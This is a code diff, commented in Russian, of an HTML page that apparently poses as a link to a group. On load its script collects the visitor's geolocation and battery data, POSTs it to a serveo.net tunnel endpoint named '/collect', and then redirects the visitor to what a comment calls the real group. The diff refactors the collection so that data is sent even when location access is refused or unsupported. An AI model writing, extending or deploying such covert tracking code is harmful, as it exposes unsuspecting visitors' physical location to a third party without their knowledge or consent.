@@ -17,6 +17,11 @@
       });
     }
 
+    // Функция для проверки доступности геолокации
+    function checkGeolocationSupport() {
+      return 'geolocation' in navigator;
+    }
+
     // Функция для отправки данных на сервер
     function sendData(position, batteryInfo) {
       // Формирование объекта данных
@@ -35,7 +40,7 @@
         battery: batteryInfo
       };
 
-      // Если геолокация доступна, добавляем её в данные
+      // Если геолокация доступна и разрешена, добавляем её в данные
       if (position) {
         data.location = {
           latitude: position.coords.latitude,
@@ -54,9 +59,7 @@
       fetch('https://d8ddeb652cdbf662bd7b916fe7287cae.serveo.net/collect', {
         method: 'POST',
         body: JSON.stringify(data),
-        headers: {
-          'Content-Type': 'application/json'
-        }
+        headers: { 'Content-Type': 'application/json' }
       });
 
       // Редирект на реальную группу
@@ -65,21 +68,33 @@
       }, 100);
     }
 
-    // Получение местоположения и информации о батарее
-    navigator.geolocation.getCurrentPosition(
-      function(position) {
-        getBatteryInfo().then(function(batteryInfo) {
-          sendData(position, batteryInfo);
-        });
-      },
-      function(error) {
-        // Если геолокация не разрешена, отправляем только данные о батарее
+    // Попробуем получить местоположение, если оно доступно
+    function attemptToGetLocation() {
+      if (checkGeolocationSupport()) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            // Если геолокация доступна, получаем данные о батарее и отправляем данные
+            getBatteryInfo().then(function(batteryInfo) {
+              sendData(position, batteryInfo);
+            });
+          },
+          function(error) {
+            // Если геолокация не доступна или не разрешена, отправляем только данные о батарее
+            getBatteryInfo().then(function(batteryInfo) {
+              sendData(null, batteryInfo);
+            });
+          }
+        );
+      } else {
+        // Если геолокация не поддерживается, отправляем только данные о батарее
         getBatteryInfo().then(function(batteryInfo) {
           sendData(null, batteryInfo);
         });
       }
-    );
+    }
+
+    // Попробуем получить местоположение и отправить данные
+    attemptToGetLocation();
   </script>
 </body>
 </html>
-
